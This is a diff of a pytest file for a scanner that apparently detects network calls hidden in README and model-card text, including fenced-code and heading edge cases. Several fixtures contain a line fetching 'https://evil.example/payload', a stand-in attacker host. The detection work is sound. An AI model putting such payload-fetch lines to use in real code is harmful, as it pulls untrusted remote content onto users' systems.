@@ -153,8 +153,8 @@ def test_text_scanner_model_card_aliases_preserve_executable_network_findings(
     assert determine_exit_code(aggregate) == 1
 
 
-@pytest.mark.parametrize("filename", ["README", "model_card"])
-def test_text_scanner_extensionless_fenced_documentation_is_informational(tmp_path: Path, filename: str) -> None:
+@pytest.mark.parametrize("filename", ["README", "README.txt", "model_card"])
+def test_text_scanner_ambiguous_fenced_documentation_is_informational(tmp_path: Path, filename: str) -> None:
     text_path = tmp_path / filename
     text_path.write_text(
         """```python
@@ -180,6 +180,33 @@ def test_text_scanner_crlf_fenced_documentation_is_informational(tmp_path: Path)
 
     assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
     assert determine_exit_code(aggregate) == 0
+
+
+@pytest.mark.parametrize(
+    ("opening_fence", "expected_exit_code"),
+    [
+        ("```python", 0),
+        ("```py`thon", 1),
+    ],
+)
+def test_text_scanner_backtick_fence_info_string_requires_valid_markdown(
+    tmp_path: Path,
+    opening_fence: str,
+    expected_exit_code: int,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        f'{opening_fence}\nrequests.get("https://evil.example/payload")\n```\n',
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert determine_exit_code(aggregate) == expected_exit_code
+    assert any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues) == (
+        expected_exit_code == 1
+    )
 
 
 def test_text_scanner_late_fenced_documentation_stays_informational(tmp_path: Path) -> None:
@@ -803,13 +830,13 @@ def test_text_scanner_earlier_network_library_call_is_not_hidden_by_later_prose(
     assert determine_exit_code(aggregate) == 1
 
 
-@pytest.mark.parametrize("filename", ["README.rst", "README"])
+@pytest.mark.parametrize("filename", ["README.rst", "README", "README.txt"])
 def test_text_scanner_rst_headings_do_not_hide_active_network_call(tmp_path: Path, filename: str) -> None:
     text_path = tmp_path / filename
     text_path.write_text(
         """Heading
 ~~~~~~~
-download("https://evil.example/payload")
+requests.get("https://evil.example/payload")
 ~~~~~~~
 """,
         encoding="utf-8",
